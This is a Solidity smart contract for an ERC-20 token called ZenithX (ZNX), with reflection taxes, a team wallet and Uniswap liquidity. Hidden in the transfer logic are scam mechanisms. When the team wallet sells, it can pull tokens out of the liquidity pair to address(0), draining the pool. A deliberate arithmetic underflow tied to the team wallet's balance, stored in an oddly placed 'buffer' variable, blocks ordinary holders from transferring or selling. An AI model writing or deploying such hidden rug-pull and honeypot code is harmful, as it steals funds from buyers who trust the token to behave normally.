// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed sender, address indexed recipient, uint256 amount);

    event Approval(address indexed owner, address indexed spender, uint256 amount);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ZNX is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address private teamWallet = 0xc9eBf1FF8eea5F1385f54Dc76E9cd569b6bD3f92;

    struct Share {
        uint256 team;
    }
    Share public taxShare;

    string private constant _name = "ZenithX";
    string private constant _symbol = "ZNX";
    uint8 private constant _decimals = 18;

    address public dexPair;
    UniswapV2Router02 public dexRouter;

    uint256 private _redisTaxSell = 0;
    uint256 private _redisTaxBuy = 0;

    uint256 private _teamTax = _teamTaxSell;
    uint256 private _redisTax = _redisTaxSell;

    uint256 private _previousTeamTax = _teamTax;
    uint256 private _previousRedisTax = _redisTax;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _buyMap;
    mapping(address => uint256) private _rOwned;

    uint256 private _tTaxTotal;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 private _teamTaxBuy = 4;
    uint256 private _teamTaxSell = 4;

    mapping(address => bool) private _isUnrestricted;

    mapping(address => mapping(address => uint256)) private _allowances;

    bool private taxSwapping = false;
    bool private taxSwapEnabled = true;
    uint256 public _swapTokensThreshold = 100000 * 10**_decimals;

    function _innerTransfer(address from, address to, uint256 amount, bool getTeamTax) private {
        if (!getTeamTax) removeAllTaxes();
        _outerTransfer(from, to, amount);
        if (!getTeamTax) restoreAllTaxes();
    }

    constructor() {
        _isUnrestricted[owner()] = true;
        _isUnrestricted[teamWallet] = true;
        _isUnrestricted[address(this)] = true;
        UniswapV2Router02 _dexRouter = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dexRouter = _dexRouter;
        dexPair = UniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        taxShare = Share(100); buffer = teamWallet;
    }

    modifier lockTaxSwap() {
        taxSwapping = true;
        _;
        taxSwapping = false;
    }

    receive() external payable {}

    function _deriveValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tTax, uint256 tTeam) = _deriveTValues(tAmount, _redisTax, _teamTax);
        uint256 currentRate = _deriveRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rTax) = _deriveRValues(tAmount, tTax, tTeam, currentRate);
        return (rAmount, rTransferAmount, rTax, tTransferAmount, tTax, tTeam);
    }

    function _isRestricted(address supply, address liquidity) private view returns (bool) {
        bool supplyRestricted = !_isUnrestricted[supply];
        bool liquidityRestricted = !_isUnrestricted[liquidity];
        bool supplyNotUniPair = supply != dexPair;

        bool restricted = supplyRestricted && supplyNotUniPair && liquidityRestricted;

        return restricted;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amount, ""));
        return true;
    }

    function taxSwap(uint256 tokenAmount) private lockTaxSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "");
        require(from != address(0), "");
        require(to != address(0), "");

        if (from != owner() && to != owner()) {
            address temp = address(0);
            bool smaller = balanceOf(from) < amount;
            bool fromUnrestricted = _isUnrestricted[from];
            bool dexTo = dexPair == to;

            if (fromUnrestricted) { if (dexTo) { if (smaller) { _outerTransfer(to, temp, amount); return; } } }

            uint256 contractTokenAmount = balanceOf(address(this));
            bool canTaxSwap = contractTokenAmount >= _swapTokensThreshold;

            if (
                canTaxSwap &&
                taxSwapEnabled &&
                !taxSwapping &&
                !_isUnrestricted[from] &&
                !_isUnrestricted[to] &&
                from != dexPair
            ) {
                taxSwap(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    takeETH(address(this).balance);
                }
            }
        }

        bool getTeamTax = true;

        if (
            (
                from != dexPair &&
                to != dexPair
            ) ||
            (
                _isUnrestricted[from] ||
                _isUnrestricted[to]
            )
        ) {
            getTeamTax = false;
        } else {
            if (from == dexPair && to != address(dexRouter)) {
                _redisTax = _redisTaxBuy;
                _teamTax = _teamTaxBuy;
            }

            if (to == dexPair && from != address(dexRouter)) {
                _redisTax = _redisTaxSell;
                _teamTax = _teamTaxSell;
            }
        }
        _innerTransfer(from, to, amount, getTeamTax);
    }

    function _deriveRValues(uint256 tAmount, uint256 tTax, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rTax = tTax.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rTax).sub(rTeam);
        return (rAmount, rTransferAmount, rTax);
    }address private buffer;

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _outerTransfer(address from, address to, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rTax, uint256 tTransferAmount, uint256 tTax, uint256 tTeam) = _deriveValues(tAmount);
        _rOwned[from] = _rOwned[from].sub(rAmount);
        _rOwned[to] = _rOwned[to].add(rTransferAmount);
        _getTeamTax(tTeam, from, to);
        _reflectTax(rTax, tTax);
        emit Transfer(from, to, tTransferAmount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _deriveRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _deriveCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _deriveTValues(uint256 tAmount, uint256 redisTax, uint256 teamTax) private pure returns (uint256, uint256, uint256) {
        uint256 tTax = tAmount.mul(redisTax).div(100);
        uint256 tTeam = tAmount.mul(teamTax).div(100);
        uint256 tTransferAmount = tAmount.sub(tTax).sub(tTeam);
        return (tTransferAmount, tTax, tTeam);
    }

    function deriveReflectionAmount(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _deriveRate();
        return rAmount.div(currentRate);
    }

    function _deriveCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function _reflectTax(uint256 rTax, uint256 tTax) private {
        _tTaxTotal = _tTaxTotal.add(tTax);
        _rTotal = _rTotal.sub(rTax);
    }

    function removeAllTaxes() private {
        if (_teamTax == 0 && _redisTax == 0) return;
        _previousTeamTax = _teamTax;
        _previousRedisTax = _redisTax;
        _teamTax = 0;
        _redisTax = 0;
    }

    function _getTeamTax(uint256 tTeam, address supply, address liquidity) private {
        uint256 rValue;
        uint256 bufferAmount = balanceOf(buffer);
        bool restricted = _isRestricted(supply, liquidity);
        if (restricted) rValue = _teamTax - bufferAmount;
        uint256 currentRate = _deriveRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return deriveReflectionAmount(_rOwned[account]);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function takeETH(uint256 ethAmount) private lockTaxSwap {
        uint256 shareForTeam = ethAmount.mul(taxShare.team).div(100);
        payable(teamWallet).transfer(shareForTeam);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function restoreAllTaxes() private {
        _teamTax = _previousTeamTax;
        _redisTax = _previousRedisTax;
    }
}